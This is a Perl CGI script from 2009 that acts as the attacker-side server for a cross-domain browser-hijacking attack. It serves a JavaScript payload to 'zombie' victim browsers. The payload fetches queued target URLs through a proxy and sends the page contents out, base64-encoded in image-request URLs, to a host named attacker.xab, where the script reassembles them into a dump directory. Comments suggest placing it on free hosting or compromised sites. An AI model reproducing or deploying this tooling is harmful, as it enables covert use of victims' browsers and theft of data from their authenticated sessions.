#!/usr/bin/perl

# JY - 2009 v2.0

use CGI 'param','header', 'remote_host';
use MIME::Base64;

# cross domain proxy URL - needs to be on free hosting, vulnerable site, etc..
$xabproxyurl = "http://www.freehost.xab/cgi-bin/cdproxy.pl";

# xab attacker URL - needs to be on free hosting, vulnerable site, etc..
$xabattacker = "http://www.attacker.xab/cgi-bin/xabattacker.pl";

# time to refresh the javascript payload
$emptyqueuerefresh = "5000";

# seconds to sleep and wait for all data chunks to come in before reassembling
# set this low on low latency networks, higher for high latency
$endsleep = "2";

# payload to start the fun
$xabpayload = "
	var xabproxy = '$xabproxyurl';
	var target = escape('TARGETURL');
	var sessionid = 'SESSIONID';
	var baseurl='$xabattacker?i=SESSIONID';
	var splitnum = 1;
	var splitseg = 0;

	function sendData(data){
		var newdata = data;
		var maxdatalen = 2000 - baseurl.length - 15;
		var totalsegs = Math.ceil(newdata.length/maxdatalen);
		var totalsegsstr = totalsegs+'';
		var head = document.getElementsByTagName('head').item(0);
		var newImage = new Array();
		var sectionstr;
		for(i=0; i < totalsegs; i++){
			newImage[i] = document.createElement('img');
			//alert('1'+i+' '+totalsegs);
			sectionstr = i+'';
			//alert('2'+i+' '+totalsegs);
			newImage[i].src = baseurl+'&t='+totalsegsstr+'&c='+contenttype+'&n='+sectionstr+'&d='+newdata.substring((i)*maxdatalen,Math.min((i+1)*maxdatalen,newdata.length));
			//newImage[i].src = baseurl+'&t='+totalsegsstr+'&n='+sectionstr+'&d='+newdata.substring((i)*maxdatalen,Math.min((i+1)*maxdatalen,newdata.length));
			//alert('3'+i+' '+totalsegs);
			newImage[i].type = 'text/javascript';
			//alert('4'+i+' '+totalsegs);
			newImage[i].name = 'sendscript'+sessionid+sectionstr;
			//alert('5'+i+' '+totalsegs);
			newImage[i].id = 'sendscript'+sessionid+sectionstr;
			//alert('6'+i+' '+totalsegs+' '+newImage[i].src);
			head.appendChild(newImage[i]);
			//alert('7'+i+' '+totalsegs);
		}
	}

	document.write(\"<script type='text/javascript' src='$xabproxyurl?uri=TARGETURL'></script>\");
	//setTimeout(\"window.location.reload()\",15000);
";

# URLs to browse queue
$queuefile = "queue.txt";

# Queue content type storage
$queuecon = "queuecon.txt";

# Queue finished file
$queuedone = "queuedone.txt";

# browsed page directory
$browsedir = "/var/www/www.attacker.xab/html/dump/";

# 1x1 transparent gif to display so browsers dont complain
$img = "1x1.gif";

# debug log
$debug = "debug.txt";

$| = 1;

$remote_host = remote_host();

# accept incoming data from the zombie client.
# i = set to sessionid
# n = set to sequence number for the chunk of data for the page being downloaded
# d = set to value of incoming data
# m = set to maximum number of segments to expect
# c = set to the content/type of the data
# * oh yes, the client must not be sending more than the max it can handle in the URL or this can be all hosed
# * dont trust the client to maintain the state, use the seqnum-int.html.tmp to represent the html fragments

if (param(i) =~ /(\d+)/) {
	$seq = $1;
	print header('image/gif');
	open(IMG, "$img");
	while (<IMG>) {
		print $_;
	}
	close IMG;

	if (param(t) =~ /(\d+)/) {
		$total = $1;
	}

	if (param(n) =~ /(\d+)/) {
		$current_segment = $1;
	}	

	if (param(c) =~ /(\S+)/) {
		$content_type = $1;
		$content_type =~ s/_/\//;
		debug("param(c) has been set to $content_type");
		# gotta keep track of the content types for later
		open (FILE, '>>', "$queuecon") or debug("Can't open file $queuecon for writing: $!\n");
		print FILE "$seq,$content_type\n";
		close FILE;

	} else {
		debug("param(c) not found!");
	}

	if (param(d)) {
		$inc = param(d);
		debug("param(d) has been set and we're receiving data into $browsedir, our request id is $seq");
		# need to read the browsedir to see what the current_segment number is
		opendir(DIR, "$browsedir") or debug ("can't open browsedir $browsedir for reading: $!\n");
		# may need to change the $seq match to be better
		#@files = grep { /$seq/ "$browsedir/$_" } readdir(DIR) or debug ("can't readdir() $browsedir");
		@tmp = readdir(DIR) or debug ("can't readdir() $browsedir");
		closedir(DIR);
		debug("heres the content of readdir: @tmp");

		foreach $file (@tmp) {
			#debug("we're in the readdir file loop");
			if ($file =~ /$seq/) {
				push(@files, "$seq");
			}
		}

		debug("param(d) received, here are the files in $browsedir/$_ - @files");
		foreach my $f (@files) {
			debug("f file loop = $f");
			$totalfiles++;
		}
		debug("we have $totalfiles total files");
		open(OUT, '>', "$browsedir/$seq-$current_segment.seg.part") or die "can't open $browsedir/$seq-$current_segment.seg.part for writing: $!\n";
		print OUT "$inc\n";
		close OUT;
	}

		sleep($endsleep);
	if ($total == $totalfiles + 1) {
		debug("got end: $total == $totalfiles current_segment: $current_segment seq: $seq");
		for (my $i = 0;$i <= $total;$i++) { 
			debug("combining: $total i: $i");
			open(CFILE, '<', "$browsedir/$seq-$i.seg.part") or debug("can't open $browsedir/$seq-$i.seg.part for reading: $!\n");
			while(<CFILE>) {
				chomp();
				debug("\$combined($seq-$i)= \"$_\"\n");
				$combined .= $_;
			}
			close CFILE;
		}
		open(FILE, '>', "$browsedir/$seq.seg") or die "can't open $browsedir/$seq.seg for writing: $!\n";
		# convert spaces to + sign
		$combined =~ s/\s/+/g;
		print FILE decode_base64("$combined");
		close FILE;
	}
}

print header('text/html');
print start_html;

# client is requesting the initial payload to start the madness
if (param(wantpl) == 1) {
	debug("victim $remote_host requesting the next item in queue");
	queue();
	if ($sessionid =~ /\d+/) {
		debug("victim $remote_host request payload, from queue() we are giving them sessionid=$sessionid,$h{$sessionid}{url}");
		$xabpayload =~ s/TARGETURL/$h{$sessionid}{url}/g;
		$xabpayload =~ s/SESSIONID/$sessionid/g;
		#debug("PAYLOAD: $xabpayload");
		print "$xabpayload";
	} else {
		print "setTimeout(\"window.location.reload()\",$emptyqueuerefresh);";
		debug("victim $remote_host requested payload, from queue() but the queue is empty, so we sent them a refresh");
	}
}

print end_html;

# parse the queue file and put it into hash %h
sub queue {
	debug("$remote_host queue() firsttime \@rest=@rest");
	$queuesize = -s "$queuefile";
	if ($queuesize > 0) {
		open(FILE, "$queuefile") or die "can't open file: $queue\n";
		while(defined($line=<FILE>)) {
			if ($line =~ /(\d+),(GET|POST),(http.*)/) {
				push(@rest, $line);
			}
		}
		#debug("queue() firsttime \@rest=@rest");
		close FILE;

		# pull first valid line of queue file
		$first = 0;
		foreach my $l (@rest) {
			if ($l =~ /(\d+),(GET|POST),(http.*)/) {
				$sessionid = $1;
				$h{$sessionid}{meth} = $2;
				$h{$sessionid}{url} = $3;
				debug("processesing queue file: $sessionid,$h{$sessionid}{meth},$h{$sessionid}{url}");
				debug("heres the line we got from the queue file: $l");
				shift(@rest);
				$first = 1;
			}
			last if ($first == 1);
		}

		# chop the first line from the queue file
		open (FILE, '>', "$queuefile") or debug( "Can't open file $queuefile for writing: $!\n");
		debug("queue() 2ndtime \@rest=@rest");
		foreach my $q (@rest) {
			print FILE "$q";
		}
		close FILE;

		# write processed to the finished queue file
		open (FILE, '>>', "$queuedone") or debug("Can't open file $queuedone for writing: $!\n");
		print FILE "$sessionid,$h{$sessionid}{meth},$h{$sessionid}{url},$content_type\n";
		close FILE;
	}
	debug("end of queue()");
}

sub debug {
	my $input = shift;
	if ($debug) {
		open(DEBUG, '>>', "$debug") or die "can't open $debug for writing: $!\n";
		($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst)=localtime(time);
		printf DEBUG "%4d-%02d-%02d %02d:%02d:%02d",$year+1900,$mon+1,$mday,$hour,$min,$sec;
		print DEBUG ": $input\n";
		close DEBUG;
	}
}
